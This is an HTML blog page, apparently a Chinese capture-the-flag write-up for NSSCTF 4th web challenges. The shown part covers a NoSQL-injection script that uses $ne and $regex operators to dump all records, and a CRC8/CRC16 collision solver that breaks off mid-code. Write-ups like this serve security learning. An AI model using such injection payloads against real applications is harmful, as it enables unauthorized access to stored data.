@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang=zh>
+<head>
+    <!-- so meta -->
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="HandheldFriendly" content="True">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
+    <meta name="description" content="好简单......出题人！web跟其他方向不是一个画风的啊喂！ 手笨了没抢到血www WEB ez_signin 分析源码，可知当POST传入参数类型为dict时，不存在waf过滤： if isinstance(title, str): title &#x3D; sanitize(title) query[&amp;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="NSSCTF 4th WEB wp 全解">
+<meta property="og:url" content="https://lamentxu.top/posts/2025-08-25-nssctf-4th-web-wp/index.html">
+<meta property="og:site_name" content="LamentXU">
+<meta property="og:description" content="好简单......出题人！web跟其他方向不是一个画风的啊喂！ 手笨了没抢到血www WEB ez_signin 分析源码，可知当POST传入参数类型为dict时，不存在waf过滤： if isinstance(title, str): title &#x3D; sanitize(title) query[&amp;">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19056516/01.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19056516/02.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19056516/03.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19056516/04.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19056516/05.png">
+<meta property="og:image" content="https://lamentxu.top/images/migrated/19056516/06.png">
+<meta property="article:published_time" content="2025-08-25T03:00:00.000Z">
+<meta property="article:modified_time" content="2025-08-25T03:00:00.000Z">
+<meta property="article:author" content="LamentXU">
+<meta property="article:tag" content="PHP">
+<meta property="article:tag" content="Reverse">
+<meta property="article:tag" content="Web Security">
+<meta property="article:tag" content="Writeup">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://lamentxu.top/images/migrated/19056516/01.png">
+    
+    
+      
+        
+          <link rel="shortcut icon" href="/images/cnblogs-avatar.ico">
+        
+      
+      
+        
+          <link rel="icon" type="image/png" href="/images/cnblogs-avatar.png" sizes="192x192">
+        
+      
+      
+        
+          <link rel="apple-touch-icon" sizes="180x180" href="/images/cnblogs-avatar.png">
+        
+      
+    
+    <!-- title -->
+    <title>NSSCTF 4th WEB wp 全解</title>
+    <!-- async scripts -->
+    <!-- Google Analytics -->
+
+
+    <!-- Umami Analytics -->
+
+
+    <!-- styles -->
+    
+<link rel="stylesheet" href="/css/style.css">
+
+    <!-- persian styles -->
+    
+    <!-- rss -->
+    
+    
+      <link rel="alternate" href="/atom.xml" title="LamentXU" type="application/atom+xml" />
+    
+	<!-- mathjax -->
+	
+<meta name="generator" content="Hexo 8.1.2"></head>
+
+<body class="max-width mx-auto px3 ltr">
+    
+      <div id="header-post">
+  <a id="menu-icon" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="menu-icon-tablet" href="#" aria-label="目录"><i class="fa-solid fa-bars fa-lg"></i></a>
+  <a id="top-icon-tablet" href="#" aria-label="顶部" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
+  <span id="menu">
+    <span id="nav">
+      <ul>
+        <!--
+       --><li><a href="/">首页</a></li><!--
+     --><!--
+       --><li><a href="/about/">关于</a></li><!--
+     --><!--
+       --><li><a href="/archives/">归档</a></li><!--
+     --><!--
+       --><li><a href="/search/">搜索</a></li><!--
+     -->
+      </ul>
+    </span>
+    <br/>
+    <span id="actions">
+      <ul>
+        
+        <li><a class="icon" aria-label="上一篇" href="/posts/2025-09-20-typhon-pyjail/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
+        
+        
+        <li><a class="icon" aria-label="下一篇" href="/posts/2025-07-27-nepctf-2025-web-wp/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
+        
+        <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
+        <li><a class="icon" aria-label="分享文章" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
+      </ul>
+      <span id="i-prev" class="info" style="display:none;">上一篇</span>
+      <span id="i-next" class="info" style="display:none;">下一篇</span>
+      <span id="i-top" class="info" style="display:none;">返回顶部</span>
+      <span id="i-share" class="info" style="display:none;">分享文章</span>
+    </span>
+    <br/>
+    <div id="share" style="display: none">
+      <ul>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://lamentxu.top/posts/2025-08-25-nssctf-4th-web-wp/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://lamentxu.top/posts/2025-08-25-nssctf-4th-web-wp/&text=NSSCTF 4th WEB wp 全解"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://lamentxu.top/posts/2025-08-25-nssctf-4th-web-wp/&title=NSSCTF 4th WEB wp 全解"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://lamentxu.top/posts/2025-08-25-nssctf-4th-web-wp/&is_video=false&description=NSSCTF 4th WEB wp 全解"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
+  <li><a class="icon" href="mailto:?subject=NSSCTF 4th WEB wp 全解&body=Check out this article: https://lamentxu.top/posts/2025-08-25-nssctf-4th-web-wp/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://lamentxu.top/posts/2025-08-25-nssctf-4th-web-wp/&title=NSSCTF 4th WEB wp 全解"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://lamentxu.top/posts/2025-08-25-nssctf-4th-web-wp/&title=NSSCTF 4th WEB wp 全解"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://lamentxu.top/posts/2025-08-25-nssctf-4th-web-wp/&title=NSSCTF 4th WEB wp 全解"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://lamentxu.top/posts/2025-08-25-nssctf-4th-web-wp/&title=NSSCTF 4th WEB wp 全解"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://lamentxu.top/posts/2025-08-25-nssctf-4th-web-wp/&name=NSSCTF 4th WEB wp 全解&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
+  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://lamentxu.top/posts/2025-08-25-nssctf-4th-web-wp/&t=NSSCTF 4th WEB wp 全解"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
+</ul>
+
+    </div>
+    
+    
+      <div id="toc">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB"><span class="toc-number">1.</span> <span class="toc-text">WEB</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-signin"><span class="toc-number">1.1.</span> <span class="toc-text">ez_signin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#EzCRC"><span class="toc-number">1.2.</span> <span class="toc-text">EzCRC</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mpga-filesystem"><span class="toc-number">1.3.</span> <span class="toc-text">[mpga]filesystem</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#ez-upload"><span class="toc-number">1.4.</span> <span class="toc-text">ez_upload</span></a></li></ol></li></ol>
+      </div>
+    
+  </span>
+</div>
+
+    
+    <div class="content index py4 ">
+        
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+  <header>
+    
+    <h1 class="posttitle p-name" itemprop="name headline">
+        NSSCTF 4th WEB wp 全解
+    </h1>
+
+
+
+    <div class="meta">
+      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
+        <span class="p-name" itemprop="name">LamentXU</span>
+      </span>
+      
+    <div class="postdate">
+      
+        <time datetime="2025-08-25T03:00:00.000Z" class="dt-published" itemprop="datePublished">2025-08-25</time>
+        
+        (Updated: <time datetime="2025-08-25T03:00:00.000Z" class="dt-updated" itemprop="dateModified">2025-08-25</time>)
+        
+      
+    </div>
+
+
+      
+    <div class="article-category">
+        <i class="fa-solid fa-archive"></i>
+        <a class="category-link" href="/categories/Notes/">Notes</a>
+    </div>
+
+
+      
+    <div class="article-tag">
+        <i class="fa-solid fa-tag"></i>
+        <a class="p-category" href="/tags/PHP/" rel="tag">PHP</a>, <a class="p-category" href="/tags/Reverse/" rel="tag">Reverse</a>, <a class="p-category" href="/tags/Web-Security/" rel="tag">Web Security</a>, <a class="p-category" href="/tags/Writeup/" rel="tag">Writeup</a>
+    </div>
+
+
+    </div>
+  </header>
+  
+
+  <div class="content e-content" itemprop="articleBody">
+    <p>好简单……出题人！web跟其他方向不是一个画风的啊喂！</p>
+<p>手笨了没抢到血www</p>
+<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ez-signin"><a href="#ez-signin" class="headerlink" title="ez_signin"></a>ez_signin</h2><p>分析源码，可知当POST传入参数类型为dict时，不存在waf过滤：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if isinstance(title, str):</span><br><span class="line">    title = sanitize(title)</span><br><span class="line">    query[&quot;$and&quot;].append(&#123;&quot;title&quot;: title&#125;)</span><br><span class="line">elif isinstance(title, dict):</span><br><span class="line">    query[&quot;$and&quot;].append(&#123;&quot;title&quot;: title&#125;)</span><br><span class="line"></span><br><span class="line">if isinstance(author, str):</span><br><span class="line">    author = sanitize(author)</span><br><span class="line">    query[&quot;$and&quot;].append(&#123;&quot;author&quot;: author&#125;)</span><br><span class="line">elif isinstance(author, dict):</span><br><span class="line">    query[&quot;$and&quot;].append(&#123;&quot;author&quot;: author&#125;)</span><br></pre></td></tr></table></figure>
+
+<p>因此我们使用dict传参。使用regex模式下的*匹配所有项即可：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import json</span><br><span class="line">url = &quot;http://node9.anna.nssctf.cn:29017/search&quot;</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    &quot;title&quot;: &#123;</span><br><span class="line">        &quot;$ne&quot;: &quot;&quot;  </span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;author&quot;: &#123;</span><br><span class="line">        &quot;$regex&quot;: &quot;.*&quot; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">headers = &#123;</span><br><span class="line">    &quot;Content-Type&quot;: &quot;application/json&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url, data=json.dumps(payload), headers=headers)</span><br><span class="line"></span><br><span class="line">print(json.dumps(response.json(), indent=2))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/migrated/19056516/01.png" alt="image"></p>
+<h2 id="EzCRC"><a href="#EzCRC" class="headerlink" title="EzCRC"></a>EzCRC</h2><p>看了一下大概是要求POST与key内容不同，长度相同，CRC8和CRC16相同的pass。</p>
+<p>不想手搓脚本（懒）。AI一把梭了：<a target="_blank" rel="noopener" href="https://chat01.ai/zh/chat/01K3D1CP6G832N98H0H04HQT18">https://chat01.ai/zh/chat/01K3D1CP6G832N98H0H04HQT18</a></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br></pre></td><td class="code"><pre><span class="line">import random</span><br><span class="line">from typing import List, Tuple</span><br><span class="line"></span><br><span class="line">(15, 10699630, 17262, 163)</span><br><span class="line"></span><br><span class="line"># Let&#x27;s implement the CRC16 and CRC8 exactly as in the PHP code and then</span><br><span class="line"># build a solver for last 3 bytes to make both CRC16 and CRC8 be zero.</span><br><span class="line"></span><br><span class="line">def compute_crc16_py(data: bytes) -&gt; int:</span><br><span class="line">    checksum = 0xFFFF</span><br><span class="line">    for b in data:</span><br><span class="line">        checksum ^= b</span><br><span class="line">        for _ in range(8):</span><br><span class="line">            if checksum &amp; 1:</span><br><span class="line">                checksum = ((checksum &gt;&gt; 1) ^ 0xA001)</span><br><span class="line">            else:</span><br><span class="line">                checksum &gt;&gt;= 1</span><br><span class="line">    return checksum &amp; 0xFFFF</span><br><span class="line"></span><br><span class="line">crc8_table = [</span><br><span class="line">    0x00, 0x07, 0x0E, 0x09, 0x1C, 0x1B, 0x12, 0x15,</span><br><span class="line">    0x38, 0x3F, 0x36, 0x31, 0x24, 0x23, 0x2A, 0x2D,</span><br><span class="line">    0x70, 0x77, 0x7E, 0x79, 0x6C, 0x6B, 0x62, 0x65,</span><br><span class="line">    0x48, 0x4F, 0x46, 0x41, 0x54, 0x53, 0x5A, 0x5D,</span><br><span class="line">    0xE0, 0xE7, 0xEE, 0xE9, 0xFC, 0xFB, 0xF2, 0xF5,</span><br><span class="line">    0xD8, 0xDF, 0xD6, 0xD1, 0xC4, 0xC3, 0xCA, 0xCD,</span><br><span class="line">    0x90, 0x97, 0x9E, 0x99, 0x8C, 0x8B, 0x82, 0x85,</span><br><span class="line">    0xA8, 0xAF, 0xA6, 0xA1, 0xB4, 0xB3, 0xBA, 0xBD,</span><br><span class="line">    0xC7, 0xC0, 0xC9, 0xCE, 0xDB, 0xDC, 0xD5, 0xD2,</span><br><span class="line">    0xFF, 0xF8, 0xF1, 0xF6, 0xE3, 0xE4, 0xED, 0xEA,</span><br><span class="line">    0xB7, 0xB0, 0xB9, 0xBE, 0xAB, 0xAC, 0xA5, 0xA2,</span><br><span class="line">    0x8F, 0x88, 0x81, 0x86, 0x93, 0x94, 0x9D, 0x9A,</span><br><span class="line">    0x27, 0x20, 0x29, 0x2E, 0x3B, 0x3C, 0x35, 0x32,</span><br><span class="line">    0x1F, 0x18, 0x11, 0x16, 0x03, 0x04, 0x0D, 0x0A,</span><br><span class="line">    0x57, 0x50, 0x59, 0x5E, 0x4B, 0x4C, 0x45, 0x42,</span><br><span class="line">    0x6F, 0x68, 0x61, 0x66, 0x73, 0x74, 0x7D, 0x7A,</span><br><span class="line">    0x89, 0x8E, 0x87, 0x80, 0x95, 0x92, 0x9B, 0x9C,</span><br><span class="line">    0xB1, 0xB6, 0xBF, 0xB8, 0xAD, 0xAA, 0xA3, 0xA4,</span><br><span class="line">    0xF9, 0xFE, 0xF7, 0xF0, 0xE5, 0xE2, 0xEB, 0xEC,</span><br><span class="line">    0xC1, 0xC6, 0xCF, 0xC8, 0xDD, 0xDA, 0xD3, 0xD4,</span><br><span class="line">    0x69, 0x6E, 0x67, 0x60, 0x75, 0x72, 0x7B, 0x7C,</span><br><span class="line">    0x51, 0x56, 0x5F, 0x58, 0x4D, 0x4A, 0x43, 0x44,</span><br><span class="line">    0x19, 0x1E, 0x17, 0x10, 0x05, 0x02, 0x0B, 0x0C,</span><br><span class="line">    0x21, 0x26, 0x2F, 0x28, 0x3D, 0x3A, 0x33, 0x34,</span><br><span class="line">    0x4E, 0x49, 0x40, 0x47, 0x52, 0x55, 0x5C, 0x5B,</span><br><span class="line">    0x76, 0x71, 0x78, 0x7F, 0x6A, 0x6D, 0x64, 0x63,</span><br><span class="line">    0x3E, 0x39, 0x30, 0x37, 0x22, 0x25, 0x2C, 0x2B,</span><br><span class="line">    0x06, 0x01, 0x08, 0x0F, 0x1A, 0x1D, 0x14, 0x13,</span><br><span class="line">    0xAE, 0xA9, 0xA0, 0xA7, 0xB2, 0xB5, 0xBC, 0xBB,</span><br><span class="line">    0x96, 0x91, 0x98, 0x9F, 0x8A, 0x8D, 0x84, 0x83,</span><br><span class="line">    0xDE, 0xD9, 0xD0, 0xD7, 0xC2, 0xC5, 0xCC, 0xCB,</span><br><span class="line">    0xE6, 0xE1, 0xE8, 0xEF, 0xFA, 0xFD, 0xF4, 0xF3</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">def crc8_py(data: bytes) -&gt; int:</span><br><span class="line">    crc = 0</span><br><span class="line">    for b in data:</span><br><span class="line">        crc = crc8_table[(crc ^ b) &amp; 0xff]</span><br><span class="line">    return crc &amp; 0xff</span><br><span class="line"></span><br><span class="line">secret = b&quot;Enj0yNSSCTF4th!&quot;</span><br><span class="line">len(secret), secret</span><br><span class="line"></span><br><span class="line">(15, b&#x27;Enj0yNSSCTF4th!&#x27;)</span><br><span class="line"></span><br><span class="line">def combined_crc(data: bytes) -&gt; int:</span><br><span class="line">    &quot;&quot;&quot;Return combined 24-bit value: lower 16 bits = crc16, upper 8 bits = crc8 (or reversed).&quot;&quot;&quot;</span><br><span class="line">    c16 = compute_crc16_py(data)</span><br><span class="line">    c8 = crc8_py(data)</span><br><span class="line">    return (c8 &lt;&lt; 16) | c16</span><br><span class="line"></span><br><span class="line">secret = b&quot;Enj0yNSSCTF4th!&quot;</span><br><span class="line">len(secret), combined_crc(secret), compute_crc16_py(secret), crc8_py(secret)</span><br><span class="line"></span><br><span class="line">def solve_rectangular(Acols: List[int], bvec: int) -&gt; Tuple[bool, int, List[int]]:</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    Solve A x = b over GF(2), where A is 24 x m with columns in Acols (each 24-bit int).</span><br><span class="line">    Returns (ok, x_bits, pivot_cols). x_bits is m-bit vector giving one solution with free vars 0.</span><br><span class="line">    &quot;&quot;&quot;</span><br><span class="line">    m = len(Acols)</span><br><span class="line">    # Build rows</span><br><span class="line">    rows = [0]*24</span><br><span class="line">    for r in range(24):</span><br><span class="line">        row = 0</span><br><span class="line">        for j in range(m):</span><br><span class="line">            if (Acols[j] &gt;&gt; r) &amp; 1:</span><br><span class="line">                row |= (1 &lt;&lt; j)</span><br><span class="line">        rows[r] = row</span><br><span class="line">    bbits = bvec</span><br><span class="line">    pivot_col_for_row = [-1]*24</span><br><span class="line">    r = 0</span><br><span class="line">    for c in range(m):</span><br><span class="line">        # find a row &gt;= r with bit c set</span><br><span class="line">        pivot = None</span><br><span class="line">        for rr in range(r,24):</span><br><span class="line">            if (rows[rr] &gt;&gt; c) &amp; 1:</span><br><span class="line">                pivot = rr; break</span><br><span class="line">        if pivot is None:</span><br><span class="line">            continue</span><br><span class="line">        # swap rows r and pivot</span><br><span class="line">        if pivot != r:</span><br><span class="line">            rows[r], rows[pivot] = rows[pivot], rows[r]</span><br><span class="line">            br = (bbits &gt;&gt; r) &amp; 1</span><br><span class="line">            bp = (bbits &gt;&gt; pivot) &amp; 1</span><br><span class="line">            if br != bp:</span><br><span class="line">                bbits ^= (1&lt;&lt;r) | (1&lt;&lt;pivot)</span><br><span class="line">        # eliminate other rows in column c</span><br><span class="line">        for rr in range(24):</span><br><span class="line">            if rr != r and ((rows[rr] &gt;&gt; c) &amp; 1):</span><br><span class="line">                rows[rr] ^= rows[r]</span><br><span class="line">                if ((bbits &gt;&gt; r) &amp; 1):</span><br><span class="line">                    bbits ^= (1 &lt;&lt; rr)</span><br><span class="line">        pivot_col_for_row[r] = c</span><br><span class="line">        r += 1</span><br><span class="line">        if r == 24:</span><br><span class="line">            break</span><br><span class="line">    if r &lt; 24:</span><br><span class="line">        # Not full rank -&gt; system may have no solution or infinite, but we need to ensure consistency: rows with all-zero row must have bbit zero too</span><br><span class="line">        # Check consistency</span><br><span class="line">        for rr in range(r,24):</span><br><span class="line">            if rows[rr] == 0 and ((bbits &gt;&gt; rr) &amp; 1):</span><br><span class="line">                return (False, 0, [])</span><br><span class="line">        # We cannot solve uniquely; but we can set some variables arbitrarily. For simplicity, try to use additional columns by reordering? Already considered.</span><br><span class="line">        # We&#x27;ll attempt to pick free vars as zero and determine pivot vars by back substitution using rows[0..r-1].</span><br><span class="line">    # Back-substitute to get solution with free vars zero:</span><br><span class="line">    x = 0</span><br><span class="line">    # Work from last pivot row to first</span><br><span class="line">    for i in range(r-1, -1, -1):</span><br><span class="line">        c = pivot_col_for_row[i]</span><br><span class="line">        # sum of A[i, j]*x_j for j&gt;c</span><br><span class="line">        sum_bit = 0</span><br><span class="line">        rowmask = rows[i]</span><br><span class="line">        # Bits set in rowmask excluding pivot column</span><br><span class="line">        mask_ex_pivot = rowmask &amp; ~(1 &lt;&lt; c)</span><br><span class="line">        # compute dot product with x</span><br><span class="line">        tmp = mask_ex_pivot &amp; x</span><br><span class="line">        # parity of tmp bits</span><br><span class="line">        sum_bit = bin(tmp).count(&quot;1&quot;) &amp; 1</span><br><span class="line">        bi = (bbits &gt;&gt; i) &amp; 1</span><br><span class="line">        xi = bi ^ sum_bit</span><br><span class="line">        if xi:</span><br><span class="line">            x |= (1 &lt;&lt; c)</span><br><span class="line">    pivot_cols = [pivot_col_for_row[i] for i in range(r) if pivot_col_for_row[i] != -1]</span><br><span class="line">    return (True, x, pivot_cols)</span><br><span class="line"></span><br><span class="line"># Test with m=120</span><br><span class="line">n=15</span><br><span class="line"># base message all zeros; columns for all bits across 15 bytes</span><br><span class="line">Acols_all = []</span><br><span class="line">base_msg = bytes([0]*n)</span><br><span class="line">base_crc = combined_crc(base_msg)</span><br><span class="line">target = combined_crc(secret)</span><br><span class="line">bvec = base_crc ^ target  # which equals target since base_crc=CRC(zeros)</span><br><span class="line">for pos in range(n):</span><br><span class="line">    for bit in range(8):</span><br><span class="line">        arr = bytearray(base_msg)</span><br><span class="line">        arr[pos] ^= (1 &lt;&lt; bit)</span><br><span class="line">        delta = combined_crc(bytes(arr)) ^ base_crc</span><br><span class="line">        Acols_all.append(delta)</span><br><span class="line">ok, x, pivots = solve_rectangular(Acols_all, bvec)</span><br><span class="line">ok, len(pivots), &quot;solution nonzero bits:&quot;, bin(x).count(&quot;1&quot;) if ok else None</span><br><span class="line"></span><br><span class="line">(True, 23, &#x27;solution nonzero bits:&#x27;, 12)</span><br><span class="line"></span><br><span class="line">def find_fully_printable_solution_with_last4():</span><br><span class="line">    printable = set(range(0x20, 0x7f))</span><br><span class="line">    for attempt 